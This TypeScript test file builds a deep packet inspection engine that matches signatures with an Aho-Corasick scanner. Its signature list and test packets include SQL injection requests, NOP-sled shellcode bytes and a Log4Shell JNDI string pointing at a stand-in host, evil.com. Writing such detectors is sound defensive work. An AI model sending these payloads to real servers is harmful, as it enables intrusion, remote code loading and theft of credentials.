// scripts/branch_c/test_day40_snippets.ts

// --- Snippet 1: Unified Threat Signature Registry ---
export interface ThreatSignature {
  id: string;
  name: string;
  category: "SQLI" | "XSS" | "SHELLCODE" | "CVE_EXPLOIT";
  severity: "CRITICAL" | "HIGH" | "MEDIUM";
  pattern: string;
}

export class ThreatSignatureRegistry {
  private signatures = new Map<string, ThreatSignature>();

  public register(sig: ThreatSignature): void {
    this.signatures.set(sig.id, sig);
  }

  public getAll(): ThreatSignature[] {
    return Array.from(this.signatures.values());
  }

  public getById(id: string): ThreatSignature | undefined {
    return this.signatures.get(id);
  }
}

console.log("=== Snippet 1: Threat Signature Registry ===");
const registry = new ThreatSignatureRegistry();
registry.register({ id: "SIG-101", name: "SQL Injection UNION SELECT", category: "SQLI", severity: "CRITICAL", pattern: "UNION SELECT" });
registry.register({ id: "SIG-102", name: "Cross Site Scripting Alert Tag", category: "XSS", severity: "HIGH", pattern: "<script>alert(" });
registry.register({ id: "SIG-103", name: "x86 NOP Sled Shellcode", category: "SHELLCODE", severity: "CRITICAL", pattern: "\x90\x90\x90\x90\x90" });
registry.register({ id: "SIG-104", name: "Log4j RNDI Exploit String", category: "CVE_EXPLOIT", severity: "CRITICAL", pattern: "${jndi:ldap://" });
console.log(`Registered ${registry.getAll().length} threat signatures across enterprise taxonomy.`);

// --- Snippet 2: Multi-Tier Screening (Hash Pre-Filter + AC Engine) ---
export interface PreFilterResult {
  hasCandidate: boolean;
  tokenHits: string[];
}

export class RollingTokenPreFilter {
  private tokenSet = new Set<string>();

  constructor(signatures: ThreatSignature[], private tokenLen = 4) {
    for (const sig of signatures) {
      if (sig.pattern.length >= this.tokenLen) {
        this.tokenSet.add(sig.pattern.slice(0, this.tokenLen));
      }
    }
  }

  public screen(payload: string): PreFilterResult {
    const hits: string[] = [];
    if (payload.length < this.tokenLen) return { hasCandidate: false, tokenHits: [] };

    for (let i = 0; i <= payload.length - this.tokenLen; i++) {
      const sub = payload.slice(i, i + this.tokenLen);
      if (this.tokenSet.has(sub)) {
        hits.push(sub);
      }
    }
    return { hasCandidate: hits.length > 0, tokenHits: hits };
  }
}

console.log("\n=== Snippet 2: Multi-Tier Pre-Filter Screening ===");
const preFilter = new RollingTokenPreFilter(registry.getAll());
const cleanPayload = "GET /index.html HTTP/1.1\r\nHost: enterprise.internal\r\n\r\n";
const attackPayload = "GET /search?q=1 UNION SELECT password FROM users-- HTTP/1.1";
console.log("Clean payload hit:", preFilter.screen(cleanPayload).hasCandidate);
const attackHits = preFilter.screen(attackPayload);
console.log(`Attack payload hit: ${attackHits.hasCandidate} (Tokens: [${attackHits.tokenHits.join(", ")}])`);

// --- Snippet 3: Circular Ring Buffer Boundary Continuity ---
export class PacketStreamRingBuffer {
  private overlapTail = "";

  constructor(private maxPatternLen = 16) {}

  public appendChunk(chunk: string): string {
    const combined = this.overlapTail + chunk;
    // Retain tail for next boundary scan
    if (combined.length >= this.maxPatternLen - 1) {
      this.overlapTail = combined.slice(-(this.maxPatternLen - 1));
    } else {
      this.overlapTail = combined;
    }
    return combined;
  }

  public reset(): void {
    this.overlapTail = "";
  }
}

console.log("\n=== Snippet 3: Packet Boundary Continuity ===");
const ringBuffer = new PacketStreamRingBuffer(12);
const chunk1 = "SELECT * FROM orders WHERE id = 1 UN";
const chunk2 = "ION SELECT username FROM admin";
const combinedChunk1 = ringBuffer.appendChunk(chunk1);
const combinedChunk2 = ringBuffer.appendChunk(chunk2);
console.log("Chunk 1 scanned length:", combinedChunk1.length);
console.log("Chunk 2 scanned string contains 'UNION SELECT':", combinedChunk2.includes("UNION SELECT"));

// --- Snippet 4: Fast Aho-Corasick DPI Threat Classifier ---
export interface ThreatDetection {
  signatureId: string;
  signatureName: string;
  category: string;
  severity: string;
  offset: number;
}

export class AhoCorasickDPIScanner {
  private root: any;
  private sigMap = new Map<string, ThreatSignature>();

  constructor(signatures: ThreatSignature[]) {
    // Basic AC construction
    let nodeId = 0;
    this.root = { id: nodeId++, children: new Map(), fail: null, dictSuffix: null, signatures: [] };

    for (const sig of signatures) {
      let curr = this.root;
      for (const ch of sig.pattern) {
        if (!curr.children.has(ch)) {
          curr.children.set(ch, { id: nodeId++, children: new Map(), fail: null, dictSuffix: null, signatures: [] });
        }
        curr = curr.children.get(ch);
      }
      curr.signatures.push(sig);
      this.sigMap.set(sig.id, sig);
    }

    const queue: any[] = [];
    for (const [, child] of this.root.children) {
      child.fail = this.root;
      queue.push(child);
    }

    while (queue.length > 0) {
      const curr = queue.shift();
      for (const [ch, child] of curr.children) {
        let fallback = curr.fail;
        while (fallback && !fallback.children.has(ch)) {
          fallback = fallback.fail;
        }
        child.fail = fallback ? fallback.children.get(ch) : this.root;
        child.dictSuffix = child.fail.signatures.length > 0 ? child.fail : child.fail.dictSuffix;
        queue.push(child);
      }
    }
  }

  public scan(payload: string, globalOffset = 0): ThreatDetection[] {
    const detections: ThreatDetection[] = [];
    let curr = this.root;

    for (let i = 0; i < payload.length; i++) {
      const ch = payload[i];
      while (curr !== this.root && !curr.children.has(ch)) {
        curr = curr.fail;
      }
      curr = curr.children.get(ch) ?? this.root;

      for (const sig of curr.signatures) {
        detections.push({
          signatureId: sig.id,
          signatureName: sig.name,
          category: sig.category,
          severity: sig.severity,
          offset: globalOffset + i - sig.pattern.length + 1,
        });
      }

      let dict = curr.dictSuffix;
      while (dict) {
        for (const sig of dict.signatures) {
          detections.push({
            signatureId: sig.id,
            signatureName: sig.name,
            category: sig.category,
            severity: sig.severity,
            offset: globalOffset + i - sig.pattern.length + 1,
          });
        }
        dict = dict.dictSuffix;
      }
    }
    return detections;
  }
}

console.log("\n=== Snippet 4: Threat Classifier ===");
const dpiScanner = new AhoCorasickDPIScanner(registry.getAll());
const testDetections = dpiScanner.scan("POST /api/v1?token=${jndi:ldap://evil.com/a} HTTP/1.1");
console.log(`Detections found: ${testDetections.length}`);
for (const det of testDetections) {
  console.log(`  -> [${det.severity}] ${det.signatureName} at offset ${det.offset}`);
}

// --- Snippet 5: Grand Capstone EnterpriseDPIEngine ---
export interface Packet {
  id: string;
  sourceIp: string;
  destIp: string;
  payload: string;
}

export interface InspectionVerdict {
  packetId: string;
  action: "ALLOW" | "ALERT" | "DROP";
  matchedThreats: ThreatDetection[];
  processingTimeMicros: number;
}

export class EnterpriseDPIEngine {
  private preFilter: RollingTokenPreFilter;
  private dpiScanner: AhoCorasickDPIScanner;
  private ringBuffer = new PacketStreamRingBuffer(16);
  public totalPackets = 0;
  public droppedPackets = 0;

  constructor(signatures: ThreatSignature[]) {
    this.preFilter = new RollingTokenPreFilter(signatures, 4);
    this.dpiScanner = new AhoCorasickDPIScanner(signatures);
  }

  public processPacket(pkt: Packet): InspectionVerdict {
    const start = performance.now();
    this.totalPackets++;

    // Tier 1 screening
    const filterRes = this.preFilter.screen(pkt.payload);
    if (!filterRes.hasCandidate) {
      return {
        packetId: pkt.id,
        action: "ALLOW",
        matchedThreats: [],
        processingTimeMicros: Math.round((performance.now() - start) * 1000),
      };
    }

    // Tier 2 boundary continuity & deep inspection
    const continuousPayload = this.ringBuffer.appendChunk(pkt.payload);
    const threats = this.dpiScanner.scan(continuousPayload);

    let action: "ALLOW" | "ALERT" | "DROP" = "ALLOW";
    if (threats.some((t) => t.severity === "CRITICAL")) {
      action = "DROP";
      this.droppedPackets++;
    } else if (threats.length > 0) {
      action = "ALERT";
    }

    return {
      packetId: pkt.id,
      action,
      matchedThreats: threats,
      processingTimeMicros: Math.round((performance.now() - start) * 1000),
    };
  }
}

console.log("\n=== Snippet 5: Grand Capstone EnterpriseDPIEngine ===");
const dpiEngine = new EnterpriseDPIEngine(registry.getAll());

const stream: Packet[] = [
  { id: "PKT-001", sourceIp: "192.168.1.10", destIp: "10.0.0.1", payload: "GET /health HTTP/1.1\r\nHost: api\r\n\r\n" },
  { id: "PKT-002", sourceIp: "203.0.113.45", destIp: "10.0.0.1", payload: "GET /login?user=admin' UNION SELECT password FROM users-- HTTP/1.1" },
  { id: "PKT-003", sourceIp: "198.51.100.22", destIp: "10.0.0.1", payload: "POST /upload HTTP/1.1\r\n\r\n\x90\x90\x90\x90\x90\xeb\x1f" },
];

for (const pkt of stream) {
  const verdict = dpiEngine.processPacket(pkt);
  console.log(`Packet [${verdict.packetId}] Action: ${verdict.action} (Threats: ${verdict.matchedThreats.length})`);
  for (const t of verdict.matchedThreats) {
    console.log(`   -> [${t.severity}] ${t.signatureName} (${t.signatureId})`);
  }
}
console.log(`DPI Engine Summary: Total Packets = ${dpiEngine.totalPackets}, Dropped = ${dpiEngine.droppedPackets}`);
